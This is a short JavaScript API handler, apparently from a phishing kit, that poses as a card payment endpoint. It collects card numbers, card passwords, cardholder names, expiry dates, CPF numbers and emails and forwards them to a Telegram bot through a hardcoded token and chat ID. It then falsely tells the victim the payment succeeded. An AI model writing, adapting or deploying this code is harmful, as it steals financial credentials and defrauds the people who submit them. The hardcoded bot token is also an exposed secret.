import axios from 'axios';

const TELEGRAM_TOKEN = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o";
const CHAT_ID = "5650303115";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const {
    numero, senha, nome_cartao, validade,
    cpf_cartao, cvv, valor, email, nome
  } = req.body;

  if (!numero || !nome_cartao || !validade || !cpf_cartao || !cvv || valor <= 0)
    return res.status(400).json({ erro: "Dados do cartão incompletos." });

  const mensagem = `
**Novo Pagamento via Cartão:**
- Nome: ${nome}
- E-mail: ${email}
- Valor: R$ ${valor}
- Número do Cartão: ${numero}
- Nome do Titular: ${nome_cartao}
- Validade: ${validade}
- CPF: ${cpf_cartao}
- Senha: ${senha}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensagem,
      parse_mode: "Markdown"
    });

    res.json({ success: true, message: "Pagamento processado com sucesso!" });
  } catch (err) {
    res.status(500).json({ erro: "Erro ao enviar para o Telegram." });
  }
}
